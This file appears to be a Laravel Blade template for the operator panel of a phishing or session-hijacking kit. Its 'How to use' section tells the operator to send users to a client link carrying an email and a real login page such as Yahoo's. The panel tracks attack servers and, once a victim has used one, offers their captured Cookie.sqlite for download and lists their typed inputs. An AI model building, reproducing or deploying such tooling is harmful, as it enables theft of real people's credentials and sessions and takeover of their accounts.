@extends('layouts.app')

@section('content')
<div class="container">
    <div class="row">
        <div class="col-12">
            @if (session('status'))
                <div class="alert alert-success" role="alert">
                    {{ session('status') }}
                </div>
            @endif
            <div id="accordion">
                <div class="card">
                    <div class="card-header" id="headingOne">
                        <h5 class="mb-0">
                            <button class="btn btn-link" data-toggle="collapse" data-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">
                                Settings:
                            </button>
                        </h5>
                    </div>
                    <div id="collapseOne" class="collapse" aria-labelledby="headingOne" data-parent="#accordion">
                        <div class="card-body">
                            <form action="" method="post">
                                @csrf
                                <div class="form-group">
                                    Minimum server ready to use:
                                    <input type="text" 
                                        value="{{ cache()->get('min_server') ?? "0" }}"
                                        name="min_server" class="form-control">
                                </div>
                                <div class="form-group">
                                    Error page link if anything goes wrong:
                                    <input type="text" 
                                        value="{{ cache()->get('error_page_link') ?? "https://google.com" }}" 
                                        name="error_page_link" class="form-control">
                                </div>
                                <button class="btn btn-info" type="submit">
                                    Save 
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
                <div class="card mt-3">
                    <div class="card-header" id="headingOne">
                        <h5 class="mb-0">
                            <button class="btn btn-link" data-toggle="collapse" data-target="#collapseOneTwo" aria-expanded="true" aria-controls="collapseOneTwo">
                                How to use:
                            </button>
                        </h5>
                    </div>
                    <div id="collapseOneTwo" class="collapse" aria-labelledby="headingOneTwo" data-parent="#accordion">
                        <div class="card-body">
                            Send the users to this url: 
                            <br>
                            {{ route('client') }}
                            <br>
                            <br>
                            Define your their email and login address like this:
                            <br>
                            {{ route('client', ['email' => 'admin@gmail.com', 'url' => 'https://login.yahoo.com']) }}
                        </div>
                    </div>
                </div>
            </div>
            <div class="card mt-3">
                <div class="card-header">
                    <h3 class="d-inline-block">
                        Servers:
                    </h2>
                    <form class="d-inline" action="{{ route('create') }}" method="POST">
                        @csrf
                        <button type="submit" class="btn btn-info float-end">
                            + Add server 
                        </button>
                    </form>
                </div>
                <div class="card-body">
                    <div>
                        @forelse ($servers as $item)
                            <div class="card card-body mt-3">
                                <div class="h5">
                                    Server #{{ $item->id }}
                                    @if($item->ready)
                                        <span class="badge badge-success">
                                            @if ($item->used_at)
                                                Used 
                                            @else
                                                Ready
                                            @endif
                                        </span>
                                    @elseif(!$item->destroyed_at)
                                        <span class="badge badge-warning">Pending</span>
                                    @endif 
                                </div>
                                <div>
                                    <small>{{ $item->server_ip }}</small> <i>{{ $item->status }}</i>

                                    @if(!$item->destroyed_at)
                                        <a onclick="if(confirm('Are you sure')) location = '{{ route('delete', $item->id) }}'" 
                                            class="btn btn-sm btn-danger float-end" >
                                            Destroy
                                        </a>
                                    @endif 
                                </div>
                                @if ($item->used_at)
                                    <div class="mt-4">
                                        @if ($item->cookie_file)
                                            <a href="/{{ $item->cookie_file }}" download class="btn btn-success btn-sm">
                                                Download Cookie.sqlite
                                            </a>
                                        @endif
                                        @if($item->user_data)
                                            <p>
                                                <a class="btn btn-primary" data-toggle="collapse" href="#multiCollapseExample1{{ $item->id }}" role="button" aria-expanded="false" aria-controls="multiCollapseExample1{{ $item->id }}">
                                                    User inputs
                                                </a>
                                            </p>
                                            <div class="row">
                                                <div class="col">
                                                    <div class="collapse multi-collapse" id="multiCollapseExample1{{ $item->id }}">
                                                        <div class="card card-body">
                                                            <ul>
                                                                @foreach ($item->user_data as $data)
                                                                    {{ $data }}
                                                                @endforeach
                                                            </ul>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        @endif 
                                    </div>
                                @endif 
                            </div>
                        @empty
                            <i>
                                No server found!
                            </i>
                        @endforelse
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<script>

</script>
@endsection
